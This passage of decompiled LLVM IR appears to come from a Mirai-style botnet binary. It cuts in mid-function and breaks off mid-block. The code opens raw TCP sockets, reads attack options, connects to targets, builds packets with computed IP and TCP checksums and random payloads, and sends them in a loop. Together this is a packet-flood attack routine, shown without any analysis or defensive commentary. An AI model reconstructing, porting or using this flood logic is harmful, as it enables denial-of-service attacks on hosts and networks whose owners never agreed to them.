  %v5_b524 = inttoptr i32 %v0_b510 to i32*
  %v6_b524 = call i32 @attack_get_opt_int(i32 %v0_b51c, i32* %v5_b524, i32 15, i32 %v0_b518)
  %v1_b52c = urem i32 %v6_b524, 256
  store i32 %v1_b52c, i32* %ip.global-to-local, align 4
  %v0_b530 = load i32, i32* @r7, align 4
  store i32 %v0_b530, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b538 = load i32, i32* @r4, align 4
  store i32 %v0_b538, i32* %r1.global-to-local, align 4
  %v0_b53c = load i32, i32* @r5, align 4
  store i32 %v0_b53c, i32* %r0.global-to-local, align 4
  %v5_b544 = inttoptr i32 %v0_b538 to i32*
  %v6_b544 = call i32 @attack_get_opt_int(i32 %v0_b53c, i32* %v5_b544, i32 %v0_b530, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b550 = load i32, i32* @r4, align 4
  store i32 %v0_b550, i32* %r1.global-to-local, align 4
  %v0_b558 = load i32, i32* @r5, align 4
  store i32 %v0_b558, i32* %r0.global-to-local, align 4
  %v4_b55c = inttoptr i32 %v0_b550 to i32*
  %v5_b55c = call i32 @attack_get_opt_int(i32 %v0_b558, i32* %v4_b55c, i32 1, i32 1)
  %v1_b564 = urem i32 %v5_b55c, 256
  store i32 %v1_b564, i32* %r3.global-to-local, align 4
  %v0_b568 = load i32, i32* @r7, align 4
  store i32 %v0_b568, i32* %r0.global-to-local, align 4
  %v1_b570 = inttoptr i32 %v0_b568 to i32*
  %v2_b570 = call i32 @__GI_time(i32* %v1_b570)
  %v1_b574 = load i32, i32* @r6, align 4
  %v2_b574 = add i32 %v1_b574, %v2_b570
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v3_b588 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_b588, i32* %r0.global-to-local, align 4
  %v7_b58c = icmp eq i32 %v3_b588, -1
  store i32 %v3_b588, i32* @sl, align 4
  br i1 %v7_b58c, label %dec_label_pc_b8cc, label %dec_label_pc_b598

dec_label_pc_b598:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_b5a0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_b5a0, i32* %r3.global-to-local, align 4
  store i32 4, i32* %ip.global-to-local, align 4
  %v0_b5a8 = load i32, i32* @r7, align 4
  store i32 %v0_b5a8, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_b5b4 = call i32 @__GI_setsockopt(i32 %v3_b588, i32 %v0_b5a8, i32 3, i32 %v6_b5a0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_b5b4, i32* %r0.global-to-local, align 4
  %v7_b5b8 = icmp eq i32 %v5_b5b4, -1
  br i1 %v7_b5b8, label %dec_label_pc_b8c4, label %dec_label_pc_b5c0

dec_label_pc_b5c0:                                ; preds = %dec_label_pc_b598
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_b5c4 = load i32, i32* @r8, align 4
  %v3_b5c8 = urem i32 %v0_b5c4, 65536
  store i32 %v3_b5c8, i32* @r3, align 4
  %v2_b5cc = icmp eq i32 %arg2, 0
  %v0_b5d0 = load i32, i32* @r7, align 4
  store i32 %v0_b5d0, i32* %stack_var_-44, align 4
  %v5_b5d4 = trunc i32 %v0_b5c4 to i16
  br i1 %v2_b5cc, label %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge, label %dec_label_pc_b5dc.preheader

dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge: ; preds = %dec_label_pc_b5c0
  %.pre = sext i16 %v5_b5d4 to i32
  %.pre91 = add i32 %v6_b544, 40
  br label %dec_label_pc_b768.preheader

dec_label_pc_b5dc.preheader:                      ; preds = %dec_label_pc_b5c0
  %v2_b620 = ptrtoint i32* %stack_var_-160 to i32
  %v2_b668 = ptrtoint i32* %stack_var_-64 to i32
  %v2_b680 = ptrtoint i32* %stack_var_-80 to i32
  %v2_b688 = ptrtoint i32* %stack_var_-336 to i32
  %v2_b68c = ptrtoint i32* %stack_var_-48 to i32
  %v4_b714 = zext i8 %tmp30 to i32
  %v1_b718 = and i32 %v4_b714, 18
  %v2_b71c = icmp eq i32 %v1_b718, 18
  %v1_b9cc = add i32 %v6_b544, 40
  %v4_ba0c = sext i16 %v5_b5d4 to i32
  %v3_ba18 = udiv i32 %v4_ba0c, 256
  %v1_baf4 = urem i32 %v5_b484, 2
  %tmp92 = sub nsw i32 0, %v1_baf4
  %v4_bafc = and i32 %tmp92, 32
  %v1_bb28 = urem i32 %v6_b4c4, 2
  %tmp93 = sub nsw i32 0, %v1_bb28
  %v4_bb30 = and i32 %tmp93, 8
  %v1_bb74 = urem i32 %v6_b524, 2
  %v3_b700 = sext i16 %tmp60 to i32
  %v1_b724 = and i32 %v4_b714, 5
  %v2_b724 = icmp eq i32 %v1_b724, 0
  %v4_b660 = add i32 %v2_b620, 98
  %v5_b660 = inttoptr i32 %v4_b660 to i16*
  %v1_ba14 = mul nsw i32 %v4_ba0c, 256
  %v4_ba24 = and i32 %v1_ba14, 65280
  %v5_ba24 = or i32 %v4_ba24, %v3_ba18
  %v1_bb0c = urem i32 %v6_b4a4, 2
  %tmp94 = sub nsw i32 0, %v1_bb0c
  %v4_bb14 = and i32 %tmp94, 16
  %v1_bb40 = urem i32 %v6_b4e4, 2
  %tmp95 = sub nsw i32 0, %v1_bb40
  %v4_bb48 = and i32 %tmp95, 4
  %v1_bb58 = urem i32 %v6_b504, 2
  %tmp96 = sub nsw i32 0, %v1_bb58
  %v3_bb60 = and i32 %tmp96, 2
  br label %dec_label_pc_b5dc.outer

dec_label_pc_b5dc.outer:                          ; preds = %dec_label_pc_b5dc.preheader, %.thread10
  %stack_var_-340.0.ph = phi i32 [ %tmp, %dec_label_pc_b5dc.preheader ], [ %v0_ba58, %.thread10 ]
  %stack_var_-62.0.ph = phi i16 [ %tmp31, %dec_label_pc_b5dc.preheader ], [ %stack_var_-62.2, %.thread10 ]
  %stack_var_-60.0.ph = phi i32 [ %tmp34, %dec_label_pc_b5dc.preheader ], [ %v0_b970, %.thread10 ]
  br label %dec_label_pc_b5dc

dec_label_pc_b5dc:                                ; preds = %dec_label_pc_b5dc.outer, %dec_label_pc_b750
  %stack_var_-62.0 = phi i16 [ %stack_var_-62.3, %dec_label_pc_b750 ], [ %stack_var_-62.0.ph, %dec_label_pc_b5dc.outer ]
  %stack_var_-60.0 = phi i32 [ %stack_var_-60.4, %dec_label_pc_b750 ], [ %stack_var_-60.0.ph, %dec_label_pc_b5dc.outer ]
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b5e8 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b5e8, i32* %r0.global-to-local, align 4
  %v7_b5ec = icmp eq i32 %v3_b5e8, -1
  store i32 %v3_b5e8, i32* @r8, align 4
  br i1 %v7_b5ec, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %dec_label_pc_b5dc, %dec_label_pc_b72c
  %v0_b600 = phi i32 [ %v3_b740, %dec_label_pc_b72c ], [ %v3_b5e8, %dec_label_pc_b5dc ]
  %stack_var_-62.1 = phi i16 [ %stack_var_-62.2, %dec_label_pc_b72c ], [ %stack_var_-62.0, %dec_label_pc_b5dc ]
  %stack_var_-60.1 = phi i32 [ %v0_b970, %dec_label_pc_b72c ], [ %stack_var_-60.0, %dec_label_pc_b5dc ]
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r2, align 4
  %v2_b600 = call i32 @__libc_fcntl(i32 %v0_b600, i32 3)
  store i32 4, i32* %r1.global-to-local, align 4
  %v1_b608 = or i32 %v2_b600, 2048
  store i32 %v1_b608, i32* @r2, align 4
  %v0_b60c = load i32, i32* @r8, align 4
  store i32 %v0_b60c, i32* %r0.global-to-local, align 4
  %v2_b610 = call i32 @__libc_fcntl(i32 %v0_b60c, i32 4)
  store i32 %v2_b610, i32* %r0.global-to-local, align 4
  %v3_b614 = load i32, i32* %stack_var_-44, align 4
  %v5_b61c = mul i32 %v3_b614, 24
  store i32 %v2_b620, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-64, align 4
  %v1_b62c = load i32, i32* @fp, align 4
  %v2_b62c = add i32 %v1_b62c, %v5_b61c
  store i32 %v2_b62c, i32* %r3.global-to-local, align 4
  %v1_b630 = add i32 %v2_b62c, 20
  %v2_b630 = inttoptr i32 %v1_b630 to i8*
  %v3_b630 = load i8, i8* %v2_b630, align 1
  %v4_b630 = zext i8 %v3_b630 to i32
  store i32 %v4_b630, i32* %r2.global-to-local, align 4
  %v2_b634 = icmp ugt i8 %v3_b630, 30
  %v7_b634 = icmp eq i8 %v3_b630, 31
  %v2_b638 = xor i1 %v7_b634, true
  %v3_b638 = and i1 %v2_b634, %v2_b638
  br i1 %v3_b638, label %bb, label %bb70

bb:                                               ; preds = %dec_label_pc_b5f8
  %v5_b638 = add i32 %v2_b62c, 16
  %v6_b638 = inttoptr i32 %v5_b638 to i32*
  %v7_b638 = load i32, i32* %v6_b638, align 4
  store i32 %v7_b638, i32* %r3.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_b5f8, %bb
  %v4_b63c = phi i32 [ %v2_b62c, %dec_label_pc_b5f8 ], [ %v7_b638, %bb ]
  %v4_b63c.stack_var_-60.1 = select i1 %v3_b638, i32 %v4_b63c, i32 %stack_var_-60.1
  %v2_b640 = xor i1 %v2_b634, true
  %v3_b640 = or i1 %v7_b634, %v2_b640
  br i1 %v3_b640, label %dec_label_pc_b8d8, label %dec_label_pc_b644

dec_label_pc_b644:                                ; preds = %bb70, %dec_label_pc_b8d8
  %v0_b970 = phi i32 [ %v5_b924, %dec_label_pc_b8d8 ], [ %v4_b63c.stack_var_-60.1, %bb70 ]
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  %v0_b64c = load i32, i32* @sb, align 4
  %v9_b64c = icmp eq i32 %v0_b64c, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  br i1 %v9_b64c, label %dec_label_pc_b930, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_b644
  %v4_b650 = udiv i32 %v0_b64c, 256
  %v2_b654 = urem i32 %v0_b64c, 256
  store i32 %v2_b654, i32* %r2.global-to-local, align 4
  %v5_b658 = mul nuw nsw i32 %v2_b654, 256
  %v6_b658 = or i32 %v5_b658, %v4_b650
  store i32 %v6_b658, i32* %r3.global-to-local, align 4
  store i32 %v2_b620, i32* %ip.global-to-local, align 4
  %v2_b660 = trunc i32 %v6_b658 to i16
  store i16 %v2_b660, i16* %v5_b660, align 2
  br label %dec_label_pc_b668

dec_label_pc_b668:                                ; preds = %.thread7, %dec_label_pc_b930
  %stack_var_-62.2 = phi i16 [ %v1_b930, %dec_label_pc_b930 ], [ %stack_var_-62.1, %.thread7 ]
  store i32 %v2_b668, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v0_b670 = load i32, i32* @r8, align 4
  store i32 %v0_b670, i32* %r0.global-to-local, align 4
  %v3_b674 = call i32 @__libc_connect(i32 %v0_b670, i32 %v2_b668, i32 16)
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_b67c = call i32 @__GI_time(i32* null)
  store i32 %v2_b67c, i32* %r0.global-to-local, align 4
  store i32 %v2_b680, i32* @r7, align 4
  store i32 %v2_b67c, i32* @r4, align 4
  store i32 %v2_b688, i32* @r6, align 4
  store i32 %v2_b68c, i32* @r5, align 4
  %v9_b6e0 = icmp eq i32 %tmp32, %v0_b970
  %v4_b708 = zext i16 %stack_var_-62.2 to i32
  %. = zext i1 %v9_b6e0 to i32
  %v9_b6f4 = icmp eq i1 %v9_b6e0, false
  %v9_b70c = icmp eq i32 %v3_b700, %v4_b708
  br label %dec_label_pc_b6a4

dec_label_pc_b694:                                ; preds = %.thread, %dec_label_pc_b6fc, %dec_label_pc_b724, %bb73
  %v2_b694 = call i32 @__GI_time(i32* null)
  %v0_b698 = load i32, i32* @r4, align 4
  %v2_b698 = sub i32 %v2_b694, %v0_b698
  store i32 %v2_b698, i32* %r0.global-to-local, align 4
  %v8_b6a0 = icmp sgt i32 %v2_b698, 10
  br i1 %v8_b6a0, label %dec_label_pc_b72c, label %dec_label_pc_b6a4

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b694, %dec_label_pc_b668
  store i32 256, i32* %r2.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  store i32 %v2_b688, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_b6b4 = load i32, i32* @sl, align 4
  store i32 %v0_b6b4, i32* %r0.global-to-local, align 4
  store i32 16, i32* %stack_var_-48, align 4
  %v6_b6c4 = call i32 @__libc_recvfrom(i32 %v0_b6b4, i32 %v2_b688, i32 256, i32 16384, i32 %v2_b680, i32 %v2_b68c)
  store i32 %v6_b6c4, i32* %r2.global-to-local, align 4
  %v7_b6cc = icmp eq i32 %v6_b6c4, -1
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v7_b6cc, label %dec_label_pc_b8cc, label %dec_label_pc_b6d8

dec_label_pc_b6d8:                                ; preds = %dec_label_pc_b6a4
  store i32 %v0_b970, i32* @r1, align 4
  store i32 %tmp32, i32* @r3, align 4
  store i32 %., i32* @lr, align 4
  %tmp97 = icmp ult i32 %v6_b6c4, 41
  br i1 %tmp97, label %.thread, label %bb73

.thread:                                          ; preds = %dec_label_pc_b6d8
  store i32 0, i32* @lr, align 4
  br label %dec_label_pc_b694

bb73:                                             ; preds = %dec_label_pc_b6d8
  br i1 %v9_b6f4, label %dec_label_pc_b694, label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %bb73
  store i32 %v3_b700, i32* @lr, align 4
  store i32 %v2_b620, i32* @r3, align 4
  store i32 %v4_b708, i32* %r2.global-to-local, align 4
  br i1 %v9_b70c, label %dec_label_pc_b714, label %dec_label_pc_b694

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6fc
  store i32 %v4_b714, i32* %r2.global-to-local, align 4
  store i32 %v1_b718, i32* @r3, align 4
  br i1 %v2_b71c, label %dec_label_pc_b964, label %dec_label_pc_b724

dec_label_pc_b724:                                ; preds = %dec_label_pc_b714
  br i1 %v2_b724, label %dec_label_pc_b694, label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b724, %dec_label_pc_b694
  %v0_b72c = load i32, i32* @r8, align 4
  store i32 %v0_b72c, i32* %r0.global-to-local, align 4
  %v1_b730 = call i32 @__GI___libc_close(i32 %v0_b72c)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b740 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_b740, i32* %r0.global-to-local, align 4
  %v3_b744 = icmp eq i32 %v3_b740, -1
  store i32 %v3_b740, i32* @r8, align 4
  br i1 %v3_b744, label %dec_label_pc_b750, label %dec_label_pc_b5f8

dec_label_pc_b750:                                ; preds = %dec_label_pc_b72c, %dec_label_pc_b5dc
  %stack_var_-62.3 = phi i16 [ %stack_var_-62.0, %dec_label_pc_b5dc ], [ %stack_var_-62.2, %dec_label_pc_b72c ]
  %stack_var_-60.4 = phi i32 [ %stack_var_-60.0, %dec_label_pc_b5dc ], [ %v0_b970, %dec_label_pc_b72c ]
  %v3_b750 = load i32, i32* %stack_var_-44, align 4
  store i32 %arg2, i32* @lr, align 4
  %v1_b758 = add i32 %v3_b750, 1
  store i32 %v1_b758, i32* @r3, align 4
  store i32 %v1_b758, i32* %stack_var_-44, align 4
  %v5_b764 = icmp slt i32 %v1_b758, %arg2
  br i1 %v5_b764, label %dec_label_pc_b5dc, label %dec_label_pc_b768.preheader

dec_label_pc_b768.preheader:                      ; preds = %.thread10, %dec_label_pc_b750, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge
  %v1_b7a0.pre-phi = phi i32 [ %.pre91, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v1_b9cc, %dec_label_pc_b750 ], [ %v1_b9cc, %.thread10 ]
  %v4_b884.pre-phi = phi i32 [ %.pre, %dec_label_pc_b5c0.dec_label_pc_b768.preheader_crit_edge ], [ %v4_ba0c, %dec_label_pc_b750 ], [ %v4_ba0c, %.thread10 ]
  %v3_b780 = mul i32 %v6_b544, 65536
  %v1_b784 = add i32 %v3_b780, 1310720
  %tmp75 = udiv i32 %v1_b784, 256
  %v3_b790 = and i32 %tmp75, 65280
  %v9_b88c = icmp eq i32 %v4_b884.pre-phi, ptrtoint ([3 x i8]* @global_var_ffff.36 to i32)
  %v2_b89c = icmp eq i32 %v1_b564, 0
  %v4_b794 = udiv i32 %v1_b784, 16777216
  %v5_b794 = or i32 %v3_b790, %v4_b794
  %v1_b79c = add i32 %v6_b544, 20
  br label %dec_label_pc_b768

dec_label_pc_b768:                                ; preds = %dec_label_pc_b768.preheader, %dec_label_pc_b94c
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b5cc, label %dec_label_pc_b94c, label %dec_label_pc_b77c

dec_label_pc_b77c:                                ; preds = %dec_label_pc_b768
  store i32 %v1_b784, i32* %r2.global-to-local, align 4
  store i32 %v6_b544, i32* %ip.global-to-local, align 4
  store i32 %v3_b790, i32* %r3.global-to-local, align 4
  store i32 %v5_b794, i32* @sb, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_b79c, i32* @r8, align 4
  store i32 %v1_b7a0.pre-phi, i32* @r7, align 4
  br label %dec_label_pc_b878

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b898, %dec_label_pc_b8a4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b7ac = load i32, i32* @r5, align 4
  %v3_b7ac = add i32 %v2_b7ac, 10
  %v4_b7ac = inttoptr i32 %v3_b7ac to i16*
  store i16 0, i16* %v4_b7ac, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b7b4 = load i32, i32* @r5, align 4
  store i32 %v0_b7b4, i32* @r0, align 4
  %v2_b7b8 = call i32 @checksum_generic(i32 %v0_b7b4, i32 20)
  %v3_b7b8 = trunc i32 %v2_b7b8 to i16
  store i32 %v2_b7b8, i32* %r0.global-to-local, align 4
  %v3_b7bc = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b3c0, i32* %ip.global-to-local, align 4
  %v3_b7c4 = mul i32 %v3_b7bc, 16
  %v2_b7c8 = add i32 %v3_b7c4, %v2_b3c0
  store i32 %v2_b7c8, i32* %r1.global-to-local, align 4
  %v1_b7cc = add i32 %v2_b7c8, 4
  %v2_b7cc = inttoptr i32 %v1_b7cc to i32*
  %v3_b7cc = load i32, i32* %v2_b7cc, align 4
  %v3_b7d0 = mul i32 %v3_b7cc, 65536
  store i32 %v3_b7d0, i32* %ip.global-to-local, align 4
  %tmp76 = mul i32 %v3_b7cc, 256
  %v1_b7d8 = and i32 %tmp76, 65280
  %tmp77 = udiv i32 %v3_b7cc, 256
  %v4_b7dc = urem i32 %tmp77, 256
  %v5_b7dc = or i32 %v4_b7dc, %v1_b7d8
  store i32 %v5_b7dc, i32* %r3.global-to-local, align 4
  %v1_b7e0 = add i32 %v3_b7cc, 1
  store i32 %v1_b7e0, i32* %r2.global-to-local, align 4
  store i32 %v1_b7e0, i32* %v2_b7cc, align 4
  %v0_b7e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b7e8 = load i32, i32* @r6, align 4
  %v2_b7e8 = add i32 %v1_b7e8, 4
  %v3_b7e8 = inttoptr i32 %v2_b7e8 to i32*
  store i32 %v0_b7e8, i32* %v3_b7e8, align 4
  %v0_b7ec = load i32, i32* %r1.global-to-local, align 4
  %v1_b7ec = add i32 %v0_b7ec, 8
  %v2_b7ec = inttoptr i32 %v1_b7ec to i32*
  %v3_b7ec = load i32, i32* %v2_b7ec, align 4
  %tmp78 = mul i32 %v3_b7ec, 256
  %v1_b7f8 = and i32 %tmp78, 65280
  %tmp79 = udiv i32 %v3_b7ec, 256
  %v4_b7fc = urem i32 %tmp79, 256
  %v5_b7fc = or i32 %v4_b7fc, %v1_b7f8
  store i32 %v5_b7fc, i32* %r3.global-to-local, align 4
  store i32 0, i32* @lr, align 4
  %v3_b804 = load i32, i32* @r5, align 4
  %v4_b804 = add i32 %v3_b804, 10
  %v5_b804 = inttoptr i32 %v4_b804 to i16*
  store i16 %v3_b7b8, i16* %v5_b804, align 2
  %v0_b808 = load i32, i32* %r3.global-to-local, align 4
  %v1_b808 = load i32, i32* @r6, align 4
  %v2_b808 = add i32 %v1_b808, 8
  %v3_b808 = inttoptr i32 %v2_b808 to i32*
  store i32 %v0_b808, i32* %v3_b808, align 4
  %v0_b80c = load i32, i32* @lr, align 4
  %v1_b80c = trunc i32 %v0_b80c to i16
  %v2_b80c = load i32, i32* @r6, align 4
  %v3_b80c = add i32 %v2_b80c, 16
  %v4_b80c = inttoptr i32 %v3_b80c to i16*
  store i16 %v1_b80c, i16* %v4_b80c, align 2
  %v0_b810 = load i32, i32* @r6, align 4
  store i32 %v0_b810, i32* @r1, align 4
  %v0_b814 = load i32, i32* @sb, align 4
  store i32 %v0_b814, i32* %r2.global-to-local, align 4
  %v0_b818 = load i32, i32* @r8, align 4
  store i32 %v0_b818, i32* %r3.global-to-local, align 4
  %v0_b81c = load i32, i32* @r5, align 4
  store i32 %v0_b81c, i32* %r0.global-to-local, align 4
  %v4_b820 = call i32 @checksum_tcpudp(i32 %v0_b81c, i32 %v0_b810, i32 %v0_b814, i32 %v0_b818)
  %v5_b820 = trunc i32 %v4_b820 to i16
  store i32 %v4_b820, i32* %r0.global-to-local, align 4
  %v3_b824 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b824, i32* %r3.global-to-local, align 4
  %v3_b828 = mul i32 %v3_b824, 32
  store i32 %v3_b828, i32* %lr.global-to-local, align 4
  %v3_b82c = load i32, i32* @r6, align 4
  %v4_b82c = add i32 %v3_b82c, 16
  %v5_b82c = inttoptr i32 %v4_b82c to i16*
  store i16 %v5_b820, i16* %v5_b82c, align 2
  %v0_b830 = load i32, i32* %lr.global-to-local, align 4
  %v1_b830 = load i32, i32* %r3.global-to-local, align 4
  %tmp98 = mul i32 %v1_b830, -8
  %v5_b830 = add i32 %v0_b830, %tmp98
  store i32 %v5_b830, i32* %lr.global-to-local, align 4
  %v0_b834 = load i32, i32* @r6, align 4
  %v1_b834 = add i32 %v0_b834, 2
  %v2_b834 = inttoptr i32 %v1_b834 to i16*
  %v3_b834 = load i16, i16* %v2_b834, align 2
  %v4_b834 = zext i16 %v3_b834 to i32
  store i32 %v4_b834, i32* @r6, align 4
  %v1_b838 = load i32, i32* @fp, align 4
  %v2_b838 = add i32 %v1_b838, %v5_b830
  store i32 %v2_b838, i32* @lr, align 4
  %v3_b83c = add i32 %v2_b838, 2
  %v4_b83c = inttoptr i32 %v3_b83c to i16*
  store i16 %v3_b834, i16* %v4_b83c, align 2
  %v0_b840 = load i32, i32* @r5, align 4
  store i32 %v0_b840, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b84c = load i32, i32* @sl, align 4
  store i32 %v0_b84c, i32* %r0.global-to-local, align 4
  %v0_b850 = load i32, i32* @r7, align 4
  store i32 %v0_b850, i32* %r2.global-to-local, align 4
  %v0_b854 = load i32, i32* @lr, align 4
  %v6_b85c = call i32 @__libc_sendto(i32 %v0_b84c, i32 %v0_b840, i32 %v0_b850, i32 16384, i32 %v0_b854, i32 16)
  %v3_b860 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b860, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v1_b868 = add i32 %v3_b860, 1
  store i32 %v1_b868, i32* %r0.global-to-local, align 4
  store i32 %v1_b868, i32* %stack_var_-44, align 4
  %v7_b874 = icmp slt i32 %v1_b868, %arg2
  br i1 %v7_b874, label %dec_label_pc_b878, label %dec_label_pc_b94c

dec_label_pc_b878:                                ; preds = %dec_label_pc_b7a8, %dec_label_pc_b77c
  %v1_b880 = phi i32 [ %v1_b868, %dec_label_pc_b7a8 ], [ 0, %dec_label_pc_b77c ]
  store i32 %v2_b3d0, i32* @lr, align 4
  store i32 ptrtoint (i32* @global_var_10000.35 to i32), i32* %r3.global-to-local, align 4
  %v4_b880 = mul i32 %v1_b880, 4
  %v5_b880 = add i32 %v4_b880, %v2_b3d0
  %v6_b880 = inttoptr i32 %v5_b880 to i32*
  %v7_b880 = load i32, i32* %v6_b880, align 4
  store i32 %v7_b880, i32* @r5, align 4
  store i32 %v4_b884.pre-phi, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_ffff.36 to i32), i32* %r3.global-to-local, align 4
  %v1_b890 = add i32 %v7_b880, 20
  store i32 %v1_b890, i32* @r6, align 4
  br i1 %v9_b88c, label %dec_label_pc_b940, label %dec_label_pc_b898

dec_label_pc_b898:                                ; preds = %dec_label_pc_b878, %dec_label_pc_b940
  store i32 %v1_b564, i32* %r1.global-to-local, align 4
  br i1 %v2_b89c, label %dec_label_pc_b7a8, label %dec_label_pc_b8a4

dec_label_pc_b8a4:                                ; preds = %dec_label_pc_b898
  %v0_b8a4 = load i32, i32* @r5, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 40
  store i32 %v1_b8a4, i32* @r4, align 4
  store i32 %v1_b8a4, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r1.global-to-local, align 4
  %v2_b8b0 = call i32 @rand_alphastr(i32 %v1_b8a4, i32 %v6_b544)
  store i32 %v2_b8b0, i32* %r0.global-to-local, align 4
  store i32 %v6_b544, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b8bc = load i32, i32* @r4, align 4
  %v4_b8bc = add i32 %v2_b8bc, %v6_b544
  %v5_b8bc = inttoptr i32 %v4_b8bc to i8*
  store i8 0, i8* %v5_b8bc, align 1
  br label %dec_label_pc_b7a8

dec_label_pc_b8c4:                                ; preds = %dec_label_pc_b598
  %v0_b8c4 = load i32, i32* @sl, align 4
  store i32 %v0_b8c4, i32* %r0.global-to-local, align 4
  %v1_b8c8 = call i32 @__GI___libc_close(i32 %v0_b8c4)
  store i32 %v1_b8c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b8cc

dec_label_pc_b8cc:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b94c, %entry, %dec_label_pc_b8c4
  %v1_b8d4 = phi i32 [ %v3_b588, %entry ], [ %v1_b8c8, %dec_label_pc_b8c4 ], [ %v2_b950, %dec_label_pc_b94c ], [ 0, %dec_label_pc_b6a4 ]
  store i32 %v3_b394, i32* %r4.global-to-local, align 4
  store i32 %v27_b394, i32* %lr.global-to-local, align 4
  ret i32 %v1_b8d4

dec_label_pc_b8d8:                                ; preds = %bb70
  %v1_b8d8 = add i32 %v4_b63c, 16
  %v2_b8d8 = inttoptr i32 %v1_b8d8 to i32*
  %v3_b8d8 = load i32, i32* %v2_b8d8, align 4
  store i32 %v3_b8d8, i32* @r4, align 4
  %v0_b8dc = call i32 @rand_next()
  store i32 %v0_b8dc, i32* %r0.global-to-local, align 4
  %v3_b8e0 = load i32, i32* %stack_var_-44, align 4
  %v5_b8e8 = mul i32 %v3_b8e0, 24
  %v0_b8ec = load i32, i32* @r4, align 4
  %v1_b8ec = and i32 %v0_b8ec, 16711680
  store i32 %v1_b8ec, i32* %ip.global-to-local, align 4
  %v3_b8f0 = udiv i32 %v0_b8ec, 16777216
  %v4_b8f4 = udiv i32 %v1_b8ec, 256
  %v5_b8f4 = or i32 %v4_b8f4, %v3_b8f0
  store i32 %v5_b8f4, i32* %r2.global-to-local, align 4
  %v1_b8f8 = load i32, i32* @fp, align 4
  %v2_b8f8 = add i32 %v1_b8f8, %v5_b8e8
  store i32 %v2_b8f8, i32* %r1.global-to-local, align 4
  %v1_b8fc = and i32 %v0_b8ec, 65280
  store i32 %v1_b8fc, i32* %r3.global-to-local, align 4
  %v1_b900 = add i32 %v2_b8f8, 20
  %v2_b900 = inttoptr i32 %v1_b900 to i8*
  %v3_b900 = load i8, i8* %v2_b900, align 1
  %v4_b900 = zext i8 %v3_b900 to i32
  store i32 %v4_b900, i32* %ip.global-to-local, align 4
  %v5_b908 = call i32 @llvm.bswap.i32(i32 %v0_b8ec)
  %v7_b90c = lshr i32 %v0_b8dc, %v4_b900
  %v8_b90c = add i32 %v7_b90c, %v5_b908
  store i32 %v8_b90c, i32* %r2.global-to-local, align 4
  %v1_b910 = and i32 %v8_b90c, 16711680
  store i32 %v1_b910, i32* %r0.global-to-local, align 4
  %v1_b91c = and i32 %v8_b90c, 65280
  store i32 %v1_b91c, i32* %r1.global-to-local, align 4
  %v5_b924 = call i32 @llvm.bswap.i32(i32 %v8_b90c)
  store i32 %v5_b924, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b644

dec_label_pc_b930:                                ; preds = %dec_label_pc_b644
  %v0_b930 = call i32 @rand_next()
  %v1_b930 = trunc i32 %v0_b930 to i16
  store i32 %v0_b930, i32* %r0.global-to-local, align 4
